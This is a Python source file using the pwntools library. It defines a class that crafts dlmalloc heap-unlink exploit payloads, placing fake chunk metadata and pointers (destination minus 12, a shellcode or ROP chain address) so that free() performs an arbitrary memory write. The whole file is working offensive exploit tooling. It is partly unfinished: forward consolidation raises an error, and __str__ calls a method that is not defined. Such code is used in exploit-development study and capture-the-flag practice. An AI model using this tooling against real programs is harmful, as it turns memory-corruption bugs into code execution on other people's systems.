
from pwn import *

"""
Terminology :
    Chunk whose metadata is being overwritten and later freed     :    "C"
    Chunk that is 'before' C(crafted block); "C - PREV_SIZE_C"    :    "BEFORE_C"
    Chunk that is 'after'  C(crafted block)  "C + SIZE_C"         :    "AFTER_C"
"""

class HeaplibException(Exception):
    pass

class HeapPayloadCrafter(object):
    def __init__(self, destination, source, **kw):
        """
        destination    :   Address to which `source` must be written out to.
        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
                           must be writable
        destination_2  :   Optional 2nd address to overwrite using forward consolidation.
        """
        self.destination          = destination
        self.source               = source
        self.destination_2        = kw.get("destination_2", None)
        self.source_2             = kw.get("source_2", None)
        self.only_fwd_consol      = kw.get("only_fwd_consol", False)
        self.no_back_consol       = kw.get("no_back_consol", False)
        self.allocator            = kw.get("allocator", "dlmalloc")
        self.pre_length           = kw.get("pre_length", None)
        self.post_length          = kw.get("post_length", None)
        self.pre_preset           = kw.get("pre_preset", {})
        self.post_preset          = kw.get("post_preset", {})
        self.populating_character = kw.get("populating_character", "*")
        self.size                 = kw.get("size", context.bits/8)

    def can_use(self, content, start, length):
        return content[start: start+length] == [self.populating_character] * length

    def populate_content(self, **kw):
        presets = kw.get("presets", None)
        length = kw.get("length", None)

        full_content = [self.populating_character] * length
        for offset in presets:
            content = presets[offset]
            start, end = offset, offset + len(content)

            if start < 0 and start >= length:
                raise HeaplibException("Invalid start offset when populating content")
            elif end > length:
                raise HeaplibException("Invalid end offset(%d) when populating content. Length=%d" % (end, length))

            if not self.can_use(full_content, start, len(content)):
                raise HeaplibException("Offset (%d: %d) is already used" %(start, start+len(content)))
            full_content[start:end] = content

        return full_content

    def find_usable_offset(self, i, full_list, unit_len, values_list, total_length, backward=True):
        """
        Arguments:
            i               : start index to check from
            full_list       : the list to examine values of
            unit_len        : the length of the segment to be checked if free
            values_list     : the values to place in a segment if found to be free
            total_length    : length of the full_list
            backward        : indicates if this operation is performed for prev or post
        """
        while True:
            # Extract a segment from the full list
            segment = full_list[i: i+unit_len]

            # If the segment is not long enough do the following
            if len(segment) != unit_len:
                # If backward consolidation does not work out, we attempt forward
                # consolidation
                if backward:
                    log.info("Backward consolidation not possible. Attempting "\
                             "Forward consolidation. Segment length=%d unit_len=%d"\
                             %(len(segment), unit_len))
                    self.only_fwd_consol = True
                    self.no_back_consol = True
                    return None
                # If forward consolidation does not work out, we are unable to craft
                # a usable payload
                else:
                    message = "Not enough space when performing forward consolidation.\n"\
                              "Segment length=%d unit_len=%d" % (len(segment), unit_len)
                    raise HeaplibException(message)

            # If we have a segment, we check if its actually usable. If so, bingo!
            elif self.can_use(segment, 0, len(segment)):
                contents = flat(values_list)
                full_list[i:i+unit_len] = list(contents)
                assert len(full_list) == total_length
                return i

            # Else, we try the same process from a different offset
            if backward: i += 1
            else: i -= 2

    def generate_payload(self):
        """
        Generate the payload that will be used to perform arbitrary memory
        writes during unlink.
        """

        prev = self.populate_content(presets=self.pre_preset,  length=self.pre_length)
        post = self.populate_content(presets=self.post_preset, length=self.post_length)
        metadata = ""

        # If we can use backward consolidation to write the exploit
        if not self.only_fwd_consol:
            # Find a contiguous chunk of (self.size*4) bytes that can
            # be used
            i, unit_len = 0, self.size*4
            # -16 and -15 are random values for the BEFORE_C's PREV_SIZE and SIZE
            values_list = [-16, -15, self.destination-12, self.source]
            PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
            if PREV_SIZE_C == None: PREV_SIZE_C = -1
            else: PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))

        # If we need to use forward consolidation
        if self.only_fwd_consol or (self.destination_2 and self.source_2):
            raise HeaplibException("Forward consolidation not supported yet.")
            pass

        # If no forward consolidation, fill with values that don't cause
        # a crash
        else:
            # Find a contiguous chunk towards the end of `prev` that can be
            # used to place
            # i == 8 as we don't want MMAP flag to trigger
            i, unit_len = len(prev)-8, self.size*3
            i -= unit_len
            # Lets see if the payload size can be reduced, as we don't really need
            # forward consolidation.
            if prev[-self.size*2:] == [self.populating_character]*self.size*2 and PREV_SIZE_C == -4:
                SIZE_C = -self.size
                after_c = flat(-1, -1) # this value is not used
                prev[-self.size*2:] = list(after_c)
            else:
                if (i % 2) != 0: i -= 1
                values_list = [-1, -1, -3]
                SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
                SIZE_C = SIZE_C + 4
                SIZE_C = -(len(prev) - SIZE_C)
            if self.no_back_consol:
                SIZE_C |= 1
            else:
                SIZE_C &= (-2)   # fffffffe or its equivalent based on arch

        return prev, (PREV_SIZE_C, SIZE_C), post

    def __str__(self):
        return ''.join(self.get_exploit())




"""
# TODO support for overwriting using forward consolidation
# TODO support for overwriting using forward consolidation only
# TODO edgecase that metadata's prevsize can be used as size => DONE
# TODO add support for arch 32 and 64   => DONE
# TODO support for overwriting using frontlink method
# TODO what if we can overwrite ONLY the metadata of C
"""

